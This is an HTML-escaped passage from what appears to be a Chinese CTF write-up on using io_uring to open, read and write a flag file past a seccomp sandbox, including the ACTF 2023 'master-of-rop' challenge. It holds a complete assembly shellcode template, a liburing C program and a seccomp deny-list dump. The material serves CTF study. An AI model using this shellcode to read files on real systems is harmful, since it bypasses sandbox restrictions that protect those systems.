0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;       #include &amp;lt;liburing.h&amp;gt;&#xA;&#xA;       int io_uring_enter(unsigned int fd, unsigned int to_submit,&#xA;                          unsigned int min_complete, unsigned int flags,&#xA;                          sigset_t *sig);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个系统调用用于初始化和完成（initiate and complete）I/O，使用共享的 SQ 和 CQ。 单次调用同时执行：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;提交新的 I/O 请求&lt;/li&gt;&#xA;&lt;li&gt;等待 I/O 完成&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;参数：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;fd&lt;/code&gt; 是 &lt;code&gt;io_uring_setup()&lt;/code&gt; 返回的文件描述符&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;to_submit&lt;/code&gt; 告知内核当前有多少个 SQE已准备就绪，可以立即被消费和提交&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;min_complete&lt;/code&gt;默认模式，会等待这个数量的 I/O 事件完成再返回&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;flags&lt;/code&gt;用于控制内核行为&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sig&lt;/code&gt;设置进程的信号屏蔽状态，如：是否会被&lt;code&gt;Ctrl+c&lt;/code&gt;终止。进行orw的话，置0就行&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;io_uring_sqe&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;用于传递IO操作的具体信息&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;opcode&lt;/code&gt;：决定执行什么操作，其中包含一些文件IO操作(如：一些等价于open、write的操作)、进程管理操作等&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;           /*&#xA;            * IO submission data structure (Submission Queue Entry)&#xA;            */&#xA;           struct io_uring_sqe {&#xA;                __u8 opcode;        /* type of operation for this sqe */&#xA;                __u8 flags;         /* IOSQE_ flags */&#xA;                __u16     ioprio;        /* ioprio for the request */&#xA;                __s32     fd;       /* file descriptor to do IO on */&#xA;                union {&#xA;                     __u64     off; /* offset into file */&#xA;                     __u64     addr2;&#xA;                     struct {&#xA;                          __u32     cmd_op;&#xA;                          __u32     __pad1;&#xA;                     };&#xA;                };&#xA;                union {&#xA;                     __u64     addr;     /* pointer to buffer or iovecs */&#xA;                     __u64     splice_off_in;&#xA;                     struct {&#xA;                          __u32     level;&#xA;                          __u32     optname;&#xA;                     };&#xA;                };&#xA;                __u32     len;      /* buffer size or number of iovecs */&#xA;                union {&#xA;                     __kernel_rwf_t rw_flags;&#xA;                     __u32          fsync_flags;&#xA;                     __u16          poll_events;   /* compatibility */&#xA;                     __u32          poll32_events; /* word-reversed for BE */&#xA;                     __u32          sync_range_flags;&#xA;                     __u32          msg_flags;&#xA;                     __u32          timeout_flags;&#xA;                     __u32          accept_flags;&#xA;                     __u32          cancel_flags;&#xA;                     __u32          open_flags;&#xA;                     __u32          statx_flags;&#xA;                     __u32          fadvise_advice;&#xA;                     __u32          splice_flags;&#xA;                     __u32          rename_flags;&#xA;                     __u32          unlink_flags;&#xA;                     __u32          hardlink_flags;&#xA;                     __u32          xattr_flags;&#xA;                     __u32          msg_ring_flags;&#xA;                     __u32          uring_cmd_flags;&#xA;                     __u32          waitid_flags;&#xA;                     __u32          futex_flags;&#xA;                     __u32          install_fd_flags;&#xA;                     __u32          nop_flags;&#xA;                };&#xA;                __u64     user_data;     /* data to be passed back at completion time */&#xA;                /* pack this to avoid bogus arm OABI complaints */&#xA;                union {&#xA;                     /* index into fixed buffers, if used */&#xA;                     __u16     buf_index;&#xA;                     /* for grouped buffer selection */&#xA;                     __u16     buf_group;&#xA;                } __attribute__((packed));&#xA;                /* personality to use, if used */&#xA;                __u16     personality;&#xA;                union {&#xA;                     __s32     splice_fd_in;&#xA;                     __u32     file_index;&#xA;                     __u32     optlen;&#xA;                     struct {&#xA;                          __u16     addr_len;&#xA;                          __u16     __pad3[1];&#xA;                     };&#xA;                };&#xA;                union {&#xA;                     struct {&#xA;                          __u64     addr3;&#xA;                          __u64     __pad2[1];&#xA;                     };&#xA;                     __u64     optval;&#xA;                     /*&#xA;                      * If the ring is initialized with IORING_SETUP_SQE128, then&#xA;                      * this field is used for 80 bytes of arbitrary command data&#xA;                      */&#xA;                     __u8 cmd[0];&#xA;                };&#xA;           };&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;模板&#34;&gt;&lt;span&gt;模板&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%a8%a1%e6%9d%bf&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;&#xA;&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    rsp&amp;#43;0x100   0x078: struct io_uring_params params = {};&#xA;    rsp&amp;#43;0x200   0x008: uring_fd&#xA;    rsp&amp;#43;0x208   0x008: sq_ring ptr&#xA;    rsp&amp;#43;0x210   0x008: cq_ring ptr&#xA;    rsp&amp;#43;0x218   0x008: sqes ptr&#xA;    rsp&amp;#43;0x220   0x008: flag_fd&#xA;    rsp&amp;#43;0x300   0x100: buffer&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;shellcode = asm(&amp;#34;&amp;#34;&amp;#34;&#xA;/*视情况调整栈帧*/&#xA;    add rsp, 0x2000&#xA;/*int uring_fd = syscall(SYS_io_uring_setup, 16, &amp;amp;params);*/&#xA;    mov rax, 0&#xA;    lea rdi, [rsp&amp;#43;0x100]&#xA;    mov rcx, 15&#xA;    rep stosq&#xA;    mov rdi, 16&#xA;    lea rsi, [rsp&amp;#43;0x100]&#xA;    mov rax, 0x1a9&#xA;    syscall&#xA;/*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/&#xA;    mov qword ptr [rsp&amp;#43;0x200], rax&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x208], rax&#xA;/*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0x8000000&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x210], rax&#xA;/*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0x10000000&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x218], rax&#xA;&#xA;/*openat*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 18 &#x9;/*opcode*/&#xA;    mov byte ptr [rdi&amp;#43;1], 0&#x9;/* IOSQE_ flags*/&#xA;    mov dword ptr [rdi&amp;#43;4], -100&#x9;/* file descriptor to do IO on */&#xA;    /* 要打开文件的路径存放在 rsp&amp;#43;0x300 处 */&#xA;    mov rax, 0x67616c662f2e&#xA;    mov qword ptr [rsp&amp;#43;0x300], rax&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax /*pathname*/&#xA;    mov dword ptr [rdi&amp;#43;28], 0&#x9;/*open_flag*/&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 1&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x210]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x164]&#xA;    add rdi, rdx&#xA;    mov edx, dword ptr [rdi&amp;#43;8]&#xA;    mov qword ptr [rsp&amp;#43;0x220], rdx&#xA;&#xA; /*read*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 22&#xA;    mov rax, qword ptr [rsp&amp;#43;0x220]&#xA;    mov dword ptr [rdi&amp;#43;4], eax&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax&#xA;    mov dword ptr [rdi&amp;#43;24], 0x100&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 1&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&#xA;/*write*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 23&#xA;    mov dword ptr [rdi&amp;#43;4], 1&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax&#xA;    mov dword ptr [rdi&amp;#43;24], 0x100&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&amp;#34;&amp;#34;&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;mmap映射&lt;/strong&gt;：&lt;/p&gt;&#xA;&lt;p&gt;在初始化&lt;code&gt;io_uring&lt;/code&gt;的时候，分别对&lt;code&gt;SQ&lt;/code&gt;、&lt;code&gt;CQ&lt;/code&gt;、&lt;code&gt;SQEs&lt;/code&gt;进行了三次mmap映射，&lt;code&gt;offset&lt;/code&gt;参数需要分别设置为&lt;code&gt;IORING_OFF_SQ_RING&lt;/code&gt;、&lt;code&gt;IORING_OFF_CQ_RING&lt;/code&gt;、&lt;code&gt;IORING_OFF_SQES&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#define IORING_OFF_SQ_RING 0ULL&#xA;#define IORING_OFF_CQ_RING 0x8000000ULL&#xA;#define IORING_OFF_SQES 0x10000000ULL&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;liburing&#34;&gt;&lt;span&gt;liburing&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#liburing&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;实现了对底层系统调用的封装&lt;/p&gt;&#xA;&lt;p&gt;初始化与清理&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct io_uring ring;&#xA;// 初始化 (默认128条目)&#xA;int io_uring_queue_init(unsigned entries, struct io_uring *ring, unsigned flags);&#xA;// 清理资源&#xA;void io_uring_queue_exit(struct io_uring *ring);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提交队列管理&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// 获取下一个可用的 SQE&#xA;struct io_uring_sqe *io_uring_get_sqe(struct io_uring *ring);&#xA;// 批量提交 SQE&#xA;int io_uring_submit(struct io_uring *ring);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;操作准备函数&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// 准备读操作&#xA;void io_uring_prep_read(struct io_uring_sqe *sqe, int fd, void *buf, unsigned nbytes, off_t offset);&#xA;// 准备写操作&#xA;void io_uring_prep_write(struct io_uring_sqe *sqe, int fd, const void *buf, unsigned nbytes, off_t offset);&#xA;// 准备打开操作&#xA;void io_uring_prep_openat(struct io_uring_sqe *sqe, int dfd, const char *path, int flags, mode_t mode);&#xA;// 准备关闭操作&#xA;void io_uring_prep_close(struct io_uring_sqe *sqe, int fd);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完成处理&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// 等待完成事件&#xA;int io_uring_wait_cqe(struct io_uring *ring, struct io_uring_cqe **cqe);&#xA;// 查看完成事件(非阻塞)&#xA;int io_uring_peek_cqe(struct io_uring *ring, struct io_uring_cqe **cqe);&#xA;// 标记事件已处理&#xA;void io_uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;进行orw&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// gcc -o shellcode shellcode.c -luring -lseccomp -static&#xA;#include &amp;lt;stdio.h&amp;gt;&#xA;#include &amp;lt;fcntl.h&amp;gt;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xA;#include &amp;lt;liburing.h&amp;gt;&#xA;#include &amp;lt;seccomp.h&amp;gt;&#xA;#include &amp;lt;syscall.h&amp;gt;&#xA;&#xA;#define BUFFER_SIZE 4096&#xA;&#xA;int main() {&#xA;    struct io_uring ring;&#xA;    struct io_uring_cqe *cqe;&#xA;    struct io_uring_sqe *sqe;&#xA;    char buffer[BUFFER_SIZE] = {0};&#xA;    int fd;&#xA;    &#xA;    io_uring_queue_init(16, &amp;amp;ring, 0);&#xA;    sqe = io_uring_get_sqe(&amp;amp;ring);&#xA;    io_uring_prep_openat(sqe, AT_FDCWD, &amp;#34;flag&amp;#34;, O_RDONLY, 0);&#xA;    io_uring_submit(&amp;amp;ring);&#xA;    io_uring_wait_cqe(&amp;amp;ring, &amp;amp;cqe);&#xA;    fd = cqe-&amp;gt;res;&#xA;&#xA;    sqe = io_uring_get_sqe(&amp;amp;ring);&#xA;    io_uring_prep_read(sqe, fd, buffer, BUFFER_SIZE, 0);&#xA;    io_uring_submit(&amp;amp;ring);&#xA;    io_uring_wait_cqe(&amp;amp;ring, &amp;amp;cqe);&#xA;    &#xA;    sqe = io_uring_get_sqe(&amp;amp;ring);&#xA;    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFFER_SIZE, 0);&#xA;    io_uring_submit(&amp;amp;ring);&#xA;&#xA;    io_uring_queue_exit(&amp;amp;ring);&#xA;&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;actf-2023-master-of-rop&#34;&gt;&lt;span&gt;ACTF 2023 master-of-rop&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#actf-2023-master-of-rop&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;沙箱禁掉了常用的orw及其替代syscall，需要寻找一些其他的替代syscall&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt; line  CODE  JT   JF      K&#xA;=================================&#xA; 0000: 0x20 0x00 0x00 0x00000004  A = arch&#xA; 0001: 0x15 0x00 0x19 0xc000003e  if (A != ARCH_X86_64) goto 0027&#xA; 0002: 0x20 0x00 0x00 0x00000000  A = sys_number&#xA; 0003: 0x35 0x00 0x01 0x40000000  if (A &amp;lt; 0x40000000) goto 0005&#xA; 0004: 0x15 0x00 0x16 0xffffffff  if (A != 0xffffffff) goto 0027&#xA; 0005: 0x15 0x15 0x00 0x00000000  if (A == read) goto 0027&#xA; 0006: 0x15 0x14 0x00 0x00000001  if (A == write) goto 0027&#xA; 0007: 0x15 0x13 0x00 0x00000002  if (A == open) goto 0027&#xA; 0008: 0x15 0x12 0x00 0x00000011  if (A == pread64) goto 0027&#xA; 0009: 0x15 0x11 0x00 0x00000012  if (A == pwrite64) goto 0027&#xA; 0010: 0x15 0x10 0x00 0x00000013  if (A == readv) goto 0027&#xA; 0011: 0x15 0x0f 0x00 0x00000014  if (A == writev) goto 0027&#xA; 0012: 0x15 0x0e 0x00 0x00000028  if (A == sendfile) goto 0027&#xA; 0013: 0x15 0x0d 0x00 0x0000002c  if (A == sendto) goto 0027&#xA; 0014: 0x15 0x0c 0x00 0x0000002e  if (A == sendmsg) goto 0027&#xA; 0015: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0027&#xA; 0016: 0x15 0x0a 0x00 0x00000101  if (A == openat) goto 0027&#xA; 0017: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0027&#xA; 0018: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0027&#xA; 0019: 0x15 0x07 0x00 0x0000012f  if (A == name_to_handle_at) goto 0027&#xA; 0020: 0x15 0x06 0x00 0x00000130  if (A == open_by_handle_at) goto 0027&#xA; 0021: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0027&#xA; 0022: 0x15 0x04 0x00 0x00000147  if (A == preadv2) goto 0027&#xA; 0023: 0x15 0x03 0x00 0x00000148  if (A == pwritev2) goto 0027&#xA; 0024: 0x15 0x02 0x00 0x000001ac  if (A == 0x1ac) goto 0027&#xA; 0025: 0x15 0x01 0x00 0x000001b5  if (A == 0x1b5) goto 0027&#xA; 0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW&#xA; 0027: 0x06 0x00 0x00 0x00000000  return KILL&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;确定内核版本&#34;&gt;&lt;span&gt;确定内核版本&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%a1%ae%e5%ae%9a%e5%86%85%e6%a0%b8%e7%89%88%e6%9c%ac&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;首先需要确定内核版本&lt;/p&gt;&#xA;&lt;p&gt;确定内核版本的方法：&lt;/p&gt;&#xA;&lt;p&gt;以我本地为例，我的内核版本&lt;code&gt; 6.6.87&lt;/code&gt;，但是我去调用一些新内核版本才有的系统调用：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;shellcode = asm(&amp;#39;&amp;#39;&amp;#39;&#xA;    mov rax, 454&#xA;    xor rdi, rdi&#xA;    xor rsi, rsi&#xA;    xor rdx, rdx&#xA;    syscall&#xA;    &#xA;    &amp;#39;&amp;#39;&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个syscall的返回值存在RAX是：&lt;code&gt;0xffffffffffffffda&lt;/code&gt;，在 64 位有符号数下就是 &lt;code&gt;-38&lt;/code&gt;。表示 &lt;strong&gt;&lt;code&gt;syscall&lt;/code&gt; 返回了 -ENOSYS，说明该系统调用在你这个内核版本中不存在&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;p&gt;远程的话不会回显，可以通过 &lt;code&gt;cmp rax, -38&lt;/code&gt;判断，如果ENOSYS就wirte一些信息&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;寻找代替系统调用&#34;&gt;&lt;span&gt;寻找代替系统调用&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%af%bb%e6%89%be%e4%bb%a3%e6%9b%bf%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;由于禁掉了常用的一些orw系统调用，需要去寻找其他替代的系统调用来orw&lt;/p&gt;&#xA;&lt;p&gt;别人测得的版本小于 &lt;code&gt;6.1.60&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;以 &lt;code&gt;linux-5.15.137&lt;/code&gt; 为参考&lt;/p&gt;&#xA;&lt;p&gt;深入&lt;code&gt;SYS_openat&lt;/code&gt;后发现，其主要逻辑是调用&lt;code&gt;do_filp_open&lt;/code&gt;，而&lt;code&gt;do_file_open&lt;/code&gt;又会被&lt;code&gt;io_uring.c&lt;/code&gt;这个文件调用。&lt;/p&gt;&#xA;&lt;p&gt;了解&lt;code&gt;io_uring&lt;/code&gt;之后发现其能够替代orw，至此，确定了通过&lt;code&gt;io_uring&lt;/code&gt;实现orw&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;实现&#34;&gt;&lt;span&gt;实现&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%ae%9e%e7%8e%b0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 